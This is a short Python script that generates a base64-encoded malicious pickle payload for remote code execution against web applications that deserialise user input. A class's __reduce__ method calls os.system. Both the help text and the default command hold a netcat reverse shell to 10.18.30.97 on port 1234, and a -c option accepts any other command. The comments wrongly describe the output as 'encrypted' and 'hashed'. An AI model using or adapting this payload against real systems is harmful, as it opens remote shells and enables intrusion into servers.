import pickle
import sys
import base64


# Base64 encoded string that is "encrypted" with pickle.loads()
# This script takes in a command and gives the hashed output, that then can be used in web applications
help = """
Usage: pickle_b64.py [optional]
Default command: rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | ' '/bin/sh -i 2>&1 | nc 10.18.30.97 1234 > /tmp/f'

| Name | Parameters   | Description    |
|------|--------------|----------------|
| Code | -c [command] | Custom command |
|______|______________|________________|

"""
command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | ' '/bin/sh -i 2>&1 | netcat 10.18.30.97 1234 > /tmp/f'


class rce(object):
    def __reduce__(self):
        import os
        return (os.system, (command,))


def execute(command=command):
    print(base64.b64encode(pickle.dumps(rce())))


if "-h" in sys.argv:
    print(help)
    exit(0)
if "-c" in sys.argv:
    command = ''
    for i in sys.argv[2:]:
        command += str(i) + " "
    print(base64.b64encode(pickle.dumps(rce())))
    # print(command)
elif len(sys.argv) == 1:
    execute(command)
